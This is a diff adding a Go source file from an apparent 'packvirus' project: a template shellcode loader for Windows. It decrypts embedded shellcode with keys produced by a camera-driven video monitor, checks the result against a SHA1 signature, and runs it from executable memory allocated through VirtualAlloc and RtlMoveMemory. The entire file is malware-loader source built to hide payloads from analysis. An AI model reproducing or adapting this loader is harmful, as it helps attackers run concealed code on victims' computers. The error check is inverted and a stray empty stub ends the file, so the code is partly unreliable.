@@ -1,0 +1,110 @@
+package main
+
+import (
+	"crypto/sha1"
+	"encoding/base64"
+	"encoding/hex"
+	"github.com/gonutz/ide/w32"
+	"os"
+	"packvirus/encrypt"
+	"packvirus/template/monitor"
+	"sync"
+	"syscall"
+	"time"
+	"unsafe"
+)
+
+var modelPath string = "{{  .modelPath }}"
+var labelPath string = "{{ .labelPath }}"
+var encryptedShellCode string = "{{ .encryptedShellCode }}"
+var signature string = "{{ .signature }}"
+var algorithm string = "{{ .algorithm }}"
+
+var (
+	kernel32      = syscall.NewLazyDLL("kernel32.dll")
+	VirtualAlloc  = kernel32.NewProc("VirtualAlloc")
+	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")
+)
+
+func main() {
+	wg := sync.WaitGroup{}
+	// you should load model before you start monitoring
+	//picChan := make(chan *gocv.Mat)
+	//soundChan := make(chan string)
+	keyChan := make(chan string)
+	exitChan := make(chan bool)
+
+	ticker := time.NewTicker(3 * time.Second)
+
+	baseByte, _ := base64.StdEncoding.DecodeString(encryptedShellCode)
+
+	wg.Add(2)
+
+	// start the video monitor task
+	go monitor.VideoMonitor(&wg, ticker, modelPath, labelPath, keyChan, exitChan)
+
+	go func(src []byte) {
+		defer wg.Done()
+
+		for {
+			baseByteCopy := make([]byte, len(src))
+			copy(baseByteCopy, src)
+
+			if key, ok := <-keyChan; ok {
+				sc, err := encrypt.DecryptFunctions[algorithm]([]byte(baseByteCopy), []byte(key))
+				if err != nil {
+					return
+				}
+
+				hash := sha1.New()
+				hash.Write([]byte(sc))
+				scSig := hash.Sum([]byte(""))
+
+				if hex.EncodeToString(scSig) == signature {
+					build(string(sc))
+					exitChan <- true
+					close(exitChan)
+					return
+				} else {
+					continue
+				}
+
+			} else {
+				return
+			}
+		}
+	}(baseByte)
+
+	wg.Wait()
+}
+
+//----------------Utils----------------
+
+func build(ddm string) {
+	sDec, _ := base64.StdEncoding.DecodeString(ddm)
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sDec)), 0x1000|0x2000, 0x40)
+	_, _, _ = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sDec[0])), uintptr(len(sDec)))
+	_, _, err := syscall.Syscall(addr, 0, 0, 0, 0)
+	checkError(err)
+}
+
+func checkError(err error) {
+	if err == nil {
+		os.Exit(1)
+	}
+}
+
+func showConsoleAsync(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+
+// VideoMonitor -
+func VideoMonitor() {
+
+}
